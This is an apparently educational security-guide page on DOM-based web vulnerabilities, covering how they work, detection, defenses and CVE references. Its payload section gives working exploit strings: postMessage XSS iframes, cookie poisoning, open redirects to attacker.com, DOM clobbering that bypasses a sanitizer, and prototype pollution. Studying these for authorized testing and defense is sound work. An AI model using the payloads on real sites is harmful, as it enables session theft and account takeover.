# DOM-Based Vulnerabilities

> Client-side JS handles attacker-controlled data unsafely in the DOM. **Deep dive:** [`Troubleshooting_Guide/dom.md`](../../../../Troubleshooting_Guide/dom.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Aliases / OWASP:** DOM XSS / clobbering · A03:2021
**Status:** complete

## What it is
A DOM-based vulnerability lives entirely in the browser: client-side JavaScript reads
attacker-influenced data (a "source") and passes it to a dangerous operation (a "sink") without
sanitization. The server never sees the malicious payload — the flaw is in the page's own script.

## How it works
The attacker controls a source such as `location.hash`, `document.URL`, `document.referrer`, a
cookie, or a `postMessage` event's `data`. The page's JavaScript reads that value and feeds it to a
sink — `innerHTML`, `document.write`, `eval`, `location.href`, `iframe.src` — that interprets it as
markup, code, or a navigation target. Because the dangerous transformation happens client-side,
server-side filtering and even CSP that only watches network responses can miss it. Variants beyond
classic DOM XSS include open redirect (URL written to `location`), cookie manipulation, DOM
clobbering (injected `id`/`name` attributes shadow JS globals), and prototype pollution via
attacker-supplied JSON.

## Impact
Equivalent to reflected/stored XSS when the sink executes script: session theft, account takeover,
and actions performed as the victim. Open-redirect variants enable phishing and OAuth token leakage;
clobbering and prototype pollution can disable sanitizers or flip security flags. Severity ranges
from medium (open redirect) to high/critical (DOM XSS leading to ATO).

## How to detect
- A source value (hash, query param, message) appears reflected into the page's HTML or triggers
  navigation without a round-trip to the server.
- Grep client JS for sink patterns (`innerHTML`, `document.write`, `eval`, `location =`) reachable
  from a source; browser devtools breakpoints on those sinks confirm the flow.
- A `message` listener registered without an `origin`/`source` check, or URL validation using
  `indexOf`/regex instead of strict parsing.
- Hooking `addEventListener` or the `innerHTML` setter (see Discovery tooling) surfaces live sinks.

## Exploitation (summary)
Map a controllable source to a reachable sink, then craft input that the sink mis-interprets:
markup with an event handler for `innerHTML`, a `javascript:` URL for navigation sinks, a JSON
`__proto__` payload for an assign-into-object sink, or duplicate-id elements to clobber a global.
Web-message and cookie variants are delivered cross-origin from an attacker page via an `<iframe>`.
Full payloads live in the Payloads section above.

## Payloads & techniques
> Distilled from field payload references — for authorized testing only.

### DOM XSS via web messages
Listener with no origin check that writes `event.data` into a sink.
```html
<!-- innerHTML sink -->
<iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')"></iframe>
<!-- URL check uses indexOf (substring) not startsWith -->
<iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')"></iframe>
<!-- JSON message whose url field is set on iframe.src -->
<iframe src='https://TARGET.net/' onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'></iframe>
```

### DOM-based cookie manipulation
Poison a cookie via one page, then trigger rendering of it on another.
```html
<iframe src="https://TARGET.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://TARGET.net';window.x=1;"></iframe>
```
Load 1 saves the malicious URL into a cookie; the onload redirect to home renders the poisoned cookie.

### DOM-based open redirect
A regex that validates URL *format* but not destination.
```http
GET /post?postId=4&url=https://ATTACKER.net/
```
Protocol variations that defeat naive checks:
```text
//attacker.com
\/\/attacker.com
%2F%2Fattacker.com
https:attacker.com
https://yourdomain.com@attacker.com
```

### DOM clobbering
```html
<!-- clobber a `window.x || {…}` fallback via duplicate-id anchors -->
<a id="defaultAvatar"><a id="defaultAvatar" name="avatar" href='cid:"onerror=alert(1)//'></a></a>
<!-- clobber form.attributes to break a sanitizer's property loop (HTMLJanitor bypass) -->
<form id="x" tabindex="0" onfocus="print()"><input id="attributes" /></form>
```
Trigger the second case by appending the id as a fragment:
```html
<iframe src="https://TARGET/post?postId=3" onload="setTimeout(()=>this.src=this.src+'#x',500)"></iframe>
```

### Prototype pollution via web messages
```javascript
postMessage('{"__proto__":{"isAdmin":true}}', "*");   // when app does Object.assign({}, JSON.parse(event.data))
```

### Dangerous sinks
| Sink | Example |
|------|---------|
| `innerHTML` / `outerHTML` | `el.innerHTML = userData` |
| `document.write` | `document.write(html)` |
| `location.href` | `location.href = userUrl` |
| `iframe.src` | `iframe.src = userUrl` |
| `eval` / `setTimeout` | `eval(userCode)` |

### Discovery tooling
```javascript
// Probe a postMessage listener from the target's console
window.postMessage("<b>bold</b>", "*");
window.postMessage("javascript:alert(1)", "*");
window.postMessage('{"type":"load-channel","url":"javascript:alert(1)"}', "*");

// Enumerate message listeners as they register
var orig = EventTarget.prototype.addEventListener;
EventTarget.prototype.addEventListener = function(type, fn, opts) {
  if (type === "message") console.log("[message listener]", fn.toString());
  return orig.call(this, type, fn, opts);
};
location.reload();

// Trace writes to a sink
Object.defineProperty(Element.prototype, "innerHTML", {
  set(val) { console.trace("[innerHTML]", val.substring(0,100));
    return Object.getOwnPropertyDescriptor(Element.prototype,"innerHTML").set.call(this,val); }
});
```

## Defenses
1. **Avoid dangerous sinks** — use `textContent` over `innerHTML`, build DOM nodes via safe APIs,
   and never pass untrusted data to `eval`/`setTimeout`/`Function`.
2. **Validate and parse sources strictly** — for navigation, allowlist destinations and parse URLs
   with the URL API; reject anything not same-origin/relative instead of regex-matching format.
3. **Verify `postMessage` origin and source** in every `message` listener before using `event.data`.
4. **Sanitize unavoidable HTML** with DOMPurify, and enable **Trusted Types** (`require-trusted-types-for 'script'`) so the browser blocks string-to-sink assignments.
5. Freeze prototypes / use `Object.create(null)` and `Map` to blunt clobbering and prototype
   pollution.

## Finding CVEs from scratch
- **NVD** — https://nvd.nist.gov/vuln/search?query=DOM-Based+Vulnerabilities
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=DOM-Based+Vulnerabilities
- **Exploit-DB** — https://www.exploit-db.com/search?q=DOM-Based+Vulnerabilities
- **GitHub Advisories** — https://github.com/advisories?query=DOM-Based+Vulnerabilities
- **OSV** — https://osv.dev/list?q=DOM-Based+Vulnerabilities
- **Community** — r/netsec, vendor security blogs, HackerOne Hacktivity, X/Twitter infosec.
- _Query tip: add the target product + version, e.g. `DOM-Based Vulnerabilities <product> <version>`._

## Notable CVEs
_Illustrative — verify against NVD before relying on details._
- `CVE-2018-6389` / DOM-XSS class incidents aside, `CVE-2020-11022` & `CVE-2020-11023` — jQuery
  `html()`/`append()` DOM-based XSS via crafted HTML passed to DOM-manipulation methods.
- `CVE-2015-9251` — jQuery cross-domain AJAX response executed as script (DOM-based XSS sink).
- _Canonical example: countless single-page apps writing `location.hash` into `innerHTML`, the
  archetypal DOM XSS pattern catalogued by PortSwigger._

## References
- PortSwigger Web Security Academy — DOM-based vulnerabilities & DOM XSS.
- OWASP — DOM-based XSS Prevention Cheat Sheet.
- W3C — Trusted Types specification.
